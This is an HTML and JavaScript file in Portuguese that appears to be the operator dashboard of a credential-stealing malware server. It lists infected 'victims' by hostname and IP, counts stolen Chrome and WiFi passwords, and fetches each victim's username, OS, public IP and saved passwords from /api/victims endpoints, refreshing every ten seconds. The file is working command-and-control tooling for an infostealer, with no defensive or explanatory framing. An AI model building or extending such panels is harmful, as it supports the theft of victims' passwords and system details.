<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Controle</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Consolas', 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            min-height: 100vh;
        }

        /* HEADER */
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border-bottom: 2px solid #00ff41;
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 24px;
            color: #00ff41;
            text-shadow: 0 0 10px #00ff41;
        }

        .header .status {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .header .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff41;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* STATS BAR */
        .stats-bar {
            display: flex;
            gap: 20px;
            padding: 15px 40px;
            background: #111;
            border-bottom: 1px solid #222;
        }

        .stat-card {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px 25px;
            text-align: center;
            flex: 1;
        }

        .stat-card .number {
            font-size: 32px;
            font-weight: bold;
            color: #00ff41;
        }

        .stat-card .label {
            font-size: 11px;
            color: #666;
            margin-top: 5px;
            text-transform: uppercase;
        }

        /* MAIN CONTENT */
        .main {
            padding: 30px 40px;
        }

        .section-title {
            font-size: 18px;
            color: #00ff41;
            margin-bottom: 15px;
            padding-bottom: 8px;
            border-bottom: 1px solid #222;
        }

        /* VICTIMS TABLE */
        .victims-table {
            width: 100%;
            border-collapse: collapse;
            background: #111;
            border-radius: 8px;
            overflow: hidden;
        }

        .victims-table th {
            background: #1a1a2e;
            padding: 12px 15px;
            text-align: left;
            font-size: 12px;
            text-transform: uppercase;
            color: #666;
            border-bottom: 1px solid #333;
        }

        .victims-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #222;
            font-size: 13px;
        }

        .victims-table tr:hover {
            background: #1a1a2e;
            cursor: pointer;
        }

        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
        }

        .badge-success {
            background: rgba(0, 255, 65, 0.15);
            color: #00ff41;
            border: 1px solid #00ff41;
        }

        .badge-warning {
            background: rgba(255, 165, 0, 0.15);
            color: #ffa500;
            border: 1px solid #ffa500;
        }

        .badge-danger {
            background: rgba(255, 0, 0, 0.15);
            color: #ff4444;
            border: 1px solid #ff4444;
        }

        /* DETAIL PANEL */
        .detail-panel {
            display: none;
            margin-top: 30px;
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            overflow: hidden;
        }

        .detail-panel.active {
            display: block;
        }

        .detail-header {
            background: #1a1a2e;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
        }

        .detail-header h2 {
            color: #00ff41;
            font-size: 16px;
        }

        .detail-header .close-btn {
            background: none;
            border: 1px solid #ff4444;
            color: #ff4444;
            padding: 5px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-family: inherit;
            font-size: 12px;
        }

        .detail-header .close-btn:hover {
            background: rgba(255, 0, 0, 0.2);
        }

        .detail-content {
            padding: 20px;
        }

        .detail-section {
            margin-bottom: 20px;
        }

        .detail-section h3 {
            color: #00aaff;
            font-size: 14px;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #222;
        }

        .detail-section pre {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 6px;
            font-size: 12px;
            line-height: 1.6;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #222;
        }

        .detail-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
        }

        .detail-item {
            background: #0a0a0a;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #222;
        }

        .detail-item .item-label {
            font-size: 10px;
            color: #666;
            text-transform: uppercase;
        }

        .detail-item .item-value {
            font-size: 14px;
            color: #00ff41;
            margin-top: 3px;
        }

        /* EMPTY STATE */
        .empty-state {
            text-align: center;
            padding: 60px;
            color: #444;
        }

        .empty-state .icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        /* REFRESH BUTTON */
        .refresh-btn {
            background: #1a1a2e;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-family: inherit;
            font-size: 12px;
            transition: all 0.3s;
        }

        .refresh-btn:hover {
            background: rgba(0, 255, 65, 0.15);
        }

        /* SCROLLBAR */
        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }
        ::-webkit-scrollbar-track {
            background: #111;
        }
        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 3px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #00ff41;
        }

        /* RESPONSIVE */
        @media (max-width: 768px) {
            .header { padding: 15px 20px; }
            .stats-bar { padding: 10px 20px; flex-wrap: wrap; }
            .main { padding: 20px; }
        }
    </style>
</head>
<body>
    <!-- HEADER -->
    <div class="header">
        <h1>PAINEL DE CONTROLE</h1>
        <div class="status">
            <div class="status-dot"></div>
            <span style="font-size: 12px; color: #666;">SERVIDOR ONLINE</span>
        </div>
    </div>

    <!-- STATS BAR -->
    <div class="stats-bar">
        <div class="stat-card">
            <div class="number" id="total-victims">0</div>
            <div class="label">Vítimas</div>
        </div>
        <div class="stat-card">
            <div class="number" id="total-chrome">0</div>
            <div class="label">Senhas Chrome</div>
        </div>
        <div class="stat-card">
            <div class="number" id="total-wifi">0</div>
            <div class="label">Senhas WiFi</div>
        </div>
    </div>

    <!-- MAIN -->
    <div class="main">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
            <div class="section-title" style="margin-bottom: 0; border: none;">CONEXÕES</div>
            <button class="refresh-btn" onclick="loadVictims()">ATUALIZAR</button>
        </div>

        <!-- TABLE -->
        <table class="victims-table" id="victims-table">
            <thead>
                <tr>
                    <th>Hostname</th>
                    <th>IP</th>
                    <th>Hora</th>
                    <th>Chrome</th>
                    <th>WiFi</th>
                    <th>Ações</th>
                </tr>
            </thead>
            <tbody id="victims-body">
                <tr>
                    <td colspan="6">
                        <div class="empty-state">
                            <div class="icon">Waiting...</div>
                            <p>Aguardando conexões...</p>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>

        <!-- DETAIL PANEL -->
        <div class="detail-panel" id="detail-panel">
            <div class="detail-header">
                <h2 id="detail-title">Detalhes</h2>
                <button class="close-btn" onclick="closeDetail()">FECHAR</button>
            </div>
            <div class="detail-content">
                <!-- System Info -->
                <div class="detail-section">
                    <h3>INFORMAÇÕES DO SISTEMA</h3>
                    <div class="detail-grid" id="system-info-grid"></div>
                </div>

                <!-- Chrome Passwords -->
                <div class="detail-section">
                    <h3>SENHAS DO CHROME</h3>
                    <pre id="chrome-pw-content">Nenhum dado disponível</pre>
                </div>

                <!-- WiFi Passwords -->
                <div class="detail-section">
                    <h3>SENHAS DE WIFI</h3>
                    <pre id="wifi-pw-content">Nenhum dado disponível</pre>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentVictimId = null;

        // Carrega lista de vítimas
        async function loadVictims() {
            try {
                const response = await fetch('/api/victims');
                const data = await response.json();
                const victims = data.victims || [];

                // Atualiza stats
                document.getElementById('total-victims').textContent = victims.length;
                document.getElementById('total-chrome').textContent = victims.filter(v => v.has_chrome_pw).length;
                document.getElementById('total-wifi').textContent = victims.filter(v => v.has_wifi_pw).length;

                // Atualiza tabela
                const tbody = document.getElementById('victims-body');
                if (victims.length === 0) {
                    tbody.innerHTML = `
                        <tr>
                            <td colspan="6">
                                <div class="empty-state">
                                    <div class="icon">Waiting...</div>
                                    <p>Aguardando conexões...</p>
                                </div>
                            </td>
                        </tr>
                    `;
                    return;
                }

                tbody.innerHTML = victims.map(v => `
                    <tr onclick="showDetails('${v.id}', '${v.hostname}')">
                        <td>${v.hostname}</td>
                        <td>${v.ip}</td>
                        <td>${v.timestamp}</td>
                        <td>${v.has_chrome_pw ? '<span class="badge badge-success">SIM</span>' : '<span class="badge badge-danger">NÃO</span>'}</td>
                        <td>${v.has_wifi_pw ? '<span class="badge badge-success">SIM</span>' : '<span class="badge badge-danger">NÃO</span>'}</td>
                        <td><span class="badge badge-warning">VER</span></td>
                    </tr>
                `).join('');
            } catch (e) {
                console.error('Erro ao carregar vítimas:', e);
            }
        }

        // Mostra detalhes de uma vítima
        async function showDetails(victimId, hostname) {
            currentVictimId = victimId;
            document.getElementById('detail-title').textContent = `${hostname} - Detalhes`;
            document.getElementById('detail-panel').classList.add('active');

            try {
                const response = await fetch(`/api/victim/${victimId}`);
                const data = await response.json();

                // System Info
                const grid = document.getElementById('system-info-grid');
                const info = data.system_info || {};
                const fields = [
                    { label: 'Hostname', value: info.hostname || 'N/A' },
                    { label: 'Username', value: info.username || 'N/A' },
                    { label: 'OS', value: info.os || 'N/A' },
                    { label: 'Arquitetura', value: info.architecture || 'N/A' },
                    { label: 'Processadores', value: info.processors || 'N/A' },
                    { label: 'IP Público', value: info.public_ip || 'N/A' },
                ];
                grid.innerHTML = fields.map(f => `
                    <div class="detail-item">
                        <div class="item-label">${f.label}</div>
                        <div class="item-value">${f.value}</div>
                    </div>
                `).join('');

                // Chrome
                document.getElementById('chrome-pw-content').textContent = 
                    data.chrome_passwords || 'Nenhum dado disponível';

                // WiFi
                document.getElementById('wifi-pw-content').textContent = 
                    data.wifi_passwords || 'Nenhum dado disponível';

                // Scroll to detail
                document.getElementById('detail-panel').scrollIntoView({ behavior: 'smooth' });
            } catch (e) {
                console.error('Erro ao carregar detalhes:', e);
            }
        }

        // Fecha painel de detalhes
        function closeDetail() {
            document.getElementById('detail-panel').classList.remove('active');
            currentVictimId = null;
        }

        // Auto-refresh a cada 10 segundos
        setInterval(loadVictims, 10000);

        // Carrega na abertura
        loadVictims();
    </script>
</body>
</html>
